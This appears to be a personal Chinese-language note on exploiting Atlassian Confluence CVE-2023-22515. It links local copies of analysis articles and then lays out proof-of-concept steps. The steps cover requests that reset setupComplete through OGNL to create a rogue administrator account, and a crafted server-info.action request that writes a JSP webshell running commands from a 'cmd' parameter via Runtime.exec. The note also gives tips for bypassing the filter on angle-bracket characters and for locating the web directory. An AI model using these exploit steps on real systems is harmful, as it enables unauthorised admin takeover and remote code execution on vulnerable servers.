## CVE-2023-22515

适用版本 8.X - 8.5.1

## 文章

[Atlassian Confluence CVE-2023-22515 分析](file:///F:/LocalCTF/Atlassian%20Confluence%20CVE-2023-22515%20%E5%88%86%E6%9E%90.pdf)

[对 Confluence CVE-2023-22515 的一点分析 _ CTF导航](F:\LocalCTF\对 Confluence CVE-2023-22515 的一点分析 _ CTF导航.html)

[CVE-2023-22515 _ AttackerKB](F:\LocalCTF\CVE-2023-22515 _ AttackerKB.pdf)

## 利用POC

#### 创建Admin用户

通过触发OGNL表达式来修改setup的参数

```bash
/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
或
/login.action
POST:bootstrapStatusProvider.applicationConfig.setupComplete=false
```

![image-20231013094000931](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231013094000931.png)

然后访问 /setup/setupadministrator-start.action 添加⼀个新的管理员⽤户

```bash
/setup/setupadministrator-start.action
```

![image-20231013094033376](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231013094033376.png)

#### 写WebShell

条件：写Webshell需要对Web目录具有写的权限

需要解决的几个问题：

- 使⽤ XMLWriter 写⼊数据时, JSP webshell 的 <> 字符会被过滤 （利⽤ EL 表达式的标签 ${..} 绕过 ）
- 如何确定 Confluence 的 web 路径 （多数为/opt/atlassian/confluence/confluence，也可以后台看到环境变量，  /admin/systeminfo.action 路 由, 环境变量中会显示与 Confluence 相关的路径信息）

```bash
/server-info.action?
bootstrapStatusProvider.applicationConfig.buildNumber=${Runtime.getRuntime().exec(param
.cmd)}&bootstrapStatusProvider.applicationConfig.applicationHome=/Users/exp10it/Downloa
ds/confluence-src/atlassian-confluence8.5.1/confluence&bootstrapStatusProvider.applicationConfig.configurationFileName=shell.
jsp&bootstrapStatusProvider.setupPersister.setupType=custom
```

![image-20231013094137497](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231013094137497.png)

访问 shell.jsp

![image-20231013094152516](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231013094152516.png)

## 创建Admin用户利用工具

